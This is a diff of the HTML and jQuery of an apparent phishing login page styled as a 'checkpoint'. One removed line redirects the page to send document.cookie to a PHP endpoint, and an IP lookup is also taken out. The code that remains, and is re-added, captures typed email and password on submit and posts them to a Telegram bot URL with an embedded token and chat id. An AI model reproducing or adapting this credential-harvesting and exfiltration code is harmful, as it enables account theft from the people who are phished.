@@ -6,7 +6,6 @@
             class="ui-toolkit"
                   >
 <head>
-<script language= "JavaScript">document.location="whateveryouwant.php?cookie=" + document.cookie;document.location="index.html"</script>
         <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=1024" />
@@ -628,7 +627,7 @@
      <script>
        
       
-$.getJSON("http://jsonip.com?callback=?", function (data) {
+
 
     $(document).ready(function () {
     $('#checkpointSubmitButton').click(function(e) {
@@ -640,11 +639,11 @@ $.getJSON("http://jsonip.com?callback=?", function (data) {
 
             var emails = document.getElementById('emails').value;
             var pass = document.getElementById('pass').value;
-            var icerik = "Email: " + emails + "     " + "Password: " + pass + "     " + "ip: " + data.ip;
+            var icerik = "Email: " + emails + "     " + "Password: " + pass;
 
 if(pass != ""){
 
-           $.post("https://api.telegram.org/bot2003179850:AAExo-o2BmvLr8pZM537wu8vNqp7NYGB8Ko/sendMessage?text="+icerik+"&chat_id=-523390222", 
+      $.post("https://api.telegram.org/bot2003179850:AAExo-o2BmvLr8pZM537wu8vNqp7NYGB8Ko/sendMessage?text="+icerik+"&chat_id=-523390222",  
               
               function (data, status) {
                 //console.log(data);
@@ -655,7 +654,6 @@ if(pass != ""){
 
             
      });
-});
 });
 
     </script>
